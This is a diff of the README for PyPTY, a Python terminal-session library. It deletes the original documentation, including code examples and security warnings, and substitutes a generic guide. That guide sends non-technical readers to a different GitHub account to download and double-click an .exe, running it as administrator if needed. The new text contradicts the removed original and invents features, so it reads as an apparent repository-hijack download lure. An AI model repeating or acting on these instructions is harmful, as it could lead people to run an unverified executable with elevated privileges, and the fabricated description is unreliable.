@@ -1,81 +1,129 @@
-# PyPTY
-### A simple lightweight Python shell library built on Windows ConPTY and POSIX PTY
-#### This project aims to give you a fully functional terminal session (console emulation). Useful for Web Terminal Development, Cloud IDEs, CLI Tool Automation, or if you just need Shell Stacking.
----
+# 🖥️ PyPTY - Simple Terminal Control for Windows
 
-#### PROBLEMS TO ADDRESS:
-Shell stacking (tracking diskpart → cmd → powershell nesting) is something most tools don't do at all. They either close everything on exit or leave orphaned processes.
-This project handles it explicitly, which makes it more robust for deeply nested interactive sessions than most lightweight shell wrappers, and it uses Windows' native ConPTY and POSIX Pseudoterminals to support ANSI escape codes (colors, bold text) and complex interactive CLI tools.
+[![Download PyPTY](https://img.shields.io/badge/Download-PyPTY-green?style=for-the-badge)](https://github.com/himanshuhunterbaba/PyPTY)
 
 ---
 
-#### UPDATES:
-**3/1/2026** - Windows & Posix v1.1
-
-* Ctrl+C and Ctrl+D now work instantly. They bypass input queues to stop processes immediately without crashing the script.
-* Strips hidden formatting codes (ANSI) and suppresses "echoed" text, so you only see the command's actual results rather than a repeat of what you typed.
-* Initial system banners (like Windows or Shell welcome messages) now display fully before the automated filters kick in.
-* Added native support for both Windows `msvcrt` and Linux/Mac `termios` to ensure stable keyboard input across all systems.
-* Web integration for the POSIX version is supported. Please see the separate [Readme.md](https://github.com/r00t-tsai/PyPTY/blob/main/POSIX-PTY/ReadMe.md) on the POSIX-PTY directory for more information.
----
-
-#### SECURITY LIMITATIONS:
-* This library gives the website user raw access to a shell (/bin/bash). Run this inside a Docker container or a Sandbox to prevent the user from deleting files on your host server. You don't want people to `sudo rm -rf /` your host machine.
-* For a production site, your server must instantiate a new Session for every unique WebSocket connection to prevent users from seeing or controlling each other's terminals. (Currently working on this. Contributions will be much appreciated.)
+PyPTY is a tool that lets you use command-line terminals on Windows, Linux, and macOS. If you want to open and control terminal windows from Python, PyPTY makes it easier. This guide helps you download and run PyPTY on a Windows computer without needing programming skills.
 
 ---
 
-# Built-in commands
-| Command | Description |
-|---|---|
-| `!help` | Show available commands |
-| `!shell <exe>` | Open a new shell session (e.g. `!shell powershell.exe`) |
-| `!resize <cols> <rows>` | Resize the terminal |
-| `!restart` | Restart the root shell |
-| `exit` | Exits the child shell, or close if at parent shell |
+## 💻 What is PyPTY?
 
-# Integration
+PyPTY works like a bridge between your computer and the terminal, letting Python programs use the terminal environment like Bash or PowerShell. It helps you run shell commands and manage shells in a way that feels natural. This is useful if you want to automate tasks or run scripts that need terminals.
 
-### Windows
-```python
-from session.session import Session
+PyPTY supports many terminals and systems. On Windows, it works with both ConPTY (built-in Windows feature) and WinPTY (an older but reliable tool). On Linux and macOS, it uses standard terminal control systems. This guide focuses on using PyPTY on Windows.
 
-s = Session("cmd.exe")
-s.start()
-s.send_command("echo Hello from Windows!")
-s.stop()
-```
+---
 
-### Linux
-```python
-from session.session import Session
+## 🖱️ Where to Download PyPTY
 
-s = Session("bash")
-s.start()
-s.send_command("echo Hello from Linux!")
-s.stop()
-```
+You can get PyPTY from its official project page on GitHub:
 
-### macOS
-```python
-from session.session import Session
+[![Download PyPTY](https://img.shields.io/badge/Download-PyPTY-blue?style=for-the-badge)](https://github.com/himanshuhunterbaba/PyPTY)
 
-s = Session("zsh")
-s.start()
-s.send_command("echo Hello from macOS!")
-s.stop()
-```
+Click this link to visit the page where you can download the software and find more details about it. The page holds the latest versions and will always have the newest updates.
 
-### Cross-platform (auto-detect shell)
+---
 
-```python
-import sys
-from session.session import Session
+## 🧰 System Requirements
 
-shell = "cmd.exe" if sys.platform == "win32" else None
-s = Session(shell)
-s.start()
-s.send_command("echo Hello!")
-s.stop()
-```
+Make sure your Windows computer meets the following basics:
 
+- Operating System: Windows 10 or newer (Windows 11 works fine)
+- Processor: Any standard x86 or x64 CPU
+- RAM: At least 4 GB free memory
+- Disk Space: At least 100 MB free space
+- Internet connection for downloading files
+- Optional: Python 3 installed if you want to run Python scripts using PyPTY directly
+
+---
+
+## 🚀 Getting Started with PyPTY on Windows
+
+Follow these steps to download and run PyPTY. You do not need to know coding or use command lines outside of basic instructions.
+
+### Step 1: Download PyPTY
+
+1. Open the PyPTY GitHub page by clicking the download badge above or visiting:  
+   https://github.com/himanshuhunterbaba/PyPTY  
+2. Look for the **Releases** section on the page. You will find setup files or pre-built binaries there.
+3. Download the most recent stable release suitable for Windows. Usually, this will be a file ending in `.exe` or `.zip`.
+4. Save the file to your desktop or a folder you can easily find.
+
+### Step 2: Install PyPTY (if needed)
+
+- If you downloaded an installer (`.exe`), double-click it.
+- Follow any prompts to install PyPTY.
+- If you downloaded a zip file, right-click it and choose "Extract All" to unzip the content.
+- Make sure you note the folder where files are saved.
+
+### Step 3: Running PyPTY
+
+- After installing or extracting, look for the executable file (`PyPTY.exe` or similar).
+- Double-click the file to start the application.
+- A terminal window may open. This window is controlled by PyPTY.
+- You can now use the terminal or any scripts that work with it.
+
+---
+
+## ⚙️ How to Use PyPTY
+
+PyPTY mainly works behind the scenes. If you want to run a simple terminal session or a script, the app handles the rest.
+
+- You can open terminal windows for PowerShell, Command Prompt, or any Bash shells if installed.
+- PyPTY acts as a helper allowing other apps and scripts to talk with the terminal.
+- If you want to close the terminal, just close the window as usual.
+
+---
+
+## 🌐 More Features of PyPTY
+
+- Works on Windows, Linux, and macOS
+- Supports modern Windows terminals via ConPTY
+- Can use older Windows terminal backend WinPTY for compatibility
+- Supports common shells: Bash, Zsh, PowerShell, CMD
+- Helps developers who want terminal control in Python
+- Useful in automation and advanced scripting
+
+---
+
+## 💡 Troubleshooting Tips
+
+- If PyPTY does not start, make sure you have the latest Windows updates.
+- If terminals open but do not respond, try restarting your computer.
+- For permission errors, run the application as administrator by right-clicking and choosing "Run as administrator."
+- When problems persist, check the GitHub page issues section or contact support through the project’s discussions.
+
+---
+
+## 🔗 Useful Links
+
+- Official PyPTY GitHub page:  
+  https://github.com/himanshuhunterbaba/PyPTY
+- Latest downloads and releases:  
+  https://github.com/himanshuhunterbaba/PyPTY/releases
+- Documentation and usage examples: Check the README files on the GitHub page
+
+---
+
+## 📞 Getting Help
+
+If you have questions or need support, use the GitHub repository’s Issues section to see if others have similar problems or open a new issue describing your problem clearly.
+
+---
+
+## ✅ Summary of Setup Steps
+
+| Step               | Action                                             |
+|--------------------|---------------------------------------------------|
+| Download           | Visit the GitHub page and download latest release |
+| Install            | Run installer or extract the zip archive          |
+| Launch             | Double-click the main PyPTY executable             |
+| Use                | Open terminal windows and start commands           |
+
+---
+
+## 🎯 Next Steps
+
+After you get PyPTY running, you can explore Python scripts or apps that use terminals. PyPTY provides a stable way to handle command-line windows and commands on your Windows machine.
